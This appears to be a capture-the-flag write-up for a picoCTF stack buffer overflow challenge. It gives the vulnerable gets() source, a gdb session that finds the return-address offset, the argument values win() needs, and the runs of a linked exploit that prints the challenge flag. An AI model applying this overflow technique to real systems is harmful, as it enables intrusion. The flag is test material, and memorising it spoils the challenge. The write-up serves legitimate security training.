### Binary Exploitation

### Source: PICOCTF

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/bof2]
└─$ file vuln    
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1c57f0cbd109ed51024baf11930a5364186c28df, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/bof2]
└─$ checksec vuln
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/CTF/Pico/bof2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So we're working with a x86 binary. The protection enabled is just NX meaning if we get a buffer overflow we won't be able to inject shellcode to the stack and execute it

Source code is given

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

So this is also a ret2win chall but this time around we need to pass in 2 arguments before we get the flag

As usual lets get the offset

I'll use gdb then automate with pwntool

I won't explain my process here as i've severally repeated it in my other chall i wrote about

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/bof2]
└─$ gdb -q vuln
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from vuln...
(No debugging symbols found in vuln)
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x08049338 <+0>:     endbr32 
   0x0804933c <+4>:     push   ebp
   0x0804933d <+5>:     mov    ebp,esp
   0x0804933f <+7>:     push   ebx
   0x08049340 <+8>:     sub    esp,0x74
   0x08049343 <+11>:    call   0x80491d0 <__x86.get_pc_thunk.bx>
   0x08049348 <+16>:    add    ebx,0x2cb8
   0x0804934e <+22>:    sub    esp,0xc
   0x08049351 <+25>:    lea    eax,[ebp-0x6c]
   0x08049354 <+28>:    push   eax
   0x08049355 <+29>:    call   0x80490f0 <gets@plt>
   0x0804935a <+34>:    add    esp,0x10
   0x0804935d <+37>:    sub    esp,0xc
   0x08049360 <+40>:    lea    eax,[ebp-0x6c]
   0x08049363 <+43>:    push   eax
   0x08049364 <+44>:    call   0x8049120 <puts@plt>
   0x08049369 <+49>:    add    esp,0x10
   0x0804936c <+52>:    nop
   0x0804936d <+53>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049370 <+56>:    leave  
   0x08049371 <+57>:    ret    
End of assembler dump.
gef➤  b *0x08049370
Breakpoint 1 at 0x8049370
gef➤  r
Starting program: /home/mark/Desktop/CTF/Pico/bof2/vuln 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
pwnerhacker
pwnerhacker

Breakpoint 1, 0x08049370 in vuln ()


[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xc       
$ebx   : 0x804c000  →  0x804bf10  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
$ecx   : 0xf7e1e9b8  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffcfc0  →  0xf7e1dda0  →  0xfbad2887
$ebp   : 0xffffd038  →  0xffffd058  →  0x00000000
$esi   : 0x80493f0  →  <__libc_csu_init+0> endbr32 
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x8049370  →  <vuln+56> leave 
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfc0│+0x0000: 0xf7e1dda0  →  0xfbad2887    ← $esp
0xffffcfc4│+0x0004: 0xf7e1dde7  →  0xe1e9b80a
0xffffcfc8│+0x0008: 0x00000001
0xffffcfcc│+0x000c: "pwnerhacker"
0xffffcfd0│+0x0010: "rhacker"
0xffffcfd4│+0x0014: 0x72656b ("ker"?)
0xffffcfd8│+0x0018: 0xf7c80aa9  →  <__overflow+9> add ebx, 0x19c54b
0xffffcfdc│+0x001c: 0xf7e1ba40  →  0x00000000
─────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049369 <vuln+49>        add    esp, 0x10
    0x804936c <vuln+52>        nop    
    0x804936d <vuln+53>        mov    ebx, DWORD PTR [ebp-0x4]
 →  0x8049370 <vuln+56>        leave  
    0x8049371 <vuln+57>        ret    
    0x8049372 <main+0>         endbr32 
    0x8049376 <main+4>         lea    ecx, [esp+0x4]
    0x804937a <main+8>         and    esp, 0xfffffff0
    0x804937d <main+11>        push   DWORD PTR [ecx-0x4]
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8049370 in vuln (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049370 → vuln()
[#1] 0x80493dd → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern pwnerhacker
[+] Searching 'pwnerhacker' in memory
[+] In '[heap]'(0x804d000-0x806f000), permission=rw-
  0x804d1a0 - 0x804d1ad  →   "pwnerhacker\n" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffcfcc - 0xffffcfd7  →   "pwnerhacker" 
gef➤  i f
Stack level 0, frame at 0xffffd040:
 eip = 0x8049370 in vuln; saved eip = 0x80493dd
 called by frame at 0xffffd070
 Arglist at 0xffffd038, args: 
 Locals at 0xffffd038, Previous frame's sp is 0xffffd040
 Saved registers:
  ebx at 0xffffd034, ebp at 0xffffd038, eip at 0xffffd03c
gef➤ 
```

Doing the math we get the offset `0xffffd03c - 0xffffcfcc = 0x70`

Jumping to the win function will not give us the flag

This is because the win function needs to argument to be passed for it to print the flag `win(param_1, param2)` where param_1 = 0xCAFEF00D and param_2 = 0xF00DF00D

And it does an if check to validate the parameter passed

```
if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
```

Here's my solve script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/picoctf/bo2/exploit.py)

Running it locally

```
└─$ python2 exploit.py
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[+] Starting local process './vuln': pid 33669
[*] Switching to interactive mode
[*] flag{fake_flag_for_testing}
```

It worked, so i'll run it on the remote server

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/bof2]
└─$ python2 exploit.py REMOTE saturn.picoctf.net 50844    
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[+] Opening connection to saturn.picoctf.net on port 50844: Done
[*] Switching to interactive mode
[*] picoCTF{argum3nt5_4_d4yZ_31432deb}
[*] Closed connection to saturn.picoctf.net port 50844
```

And we're done 

<br> <br>
[Back To Home](../index.md)
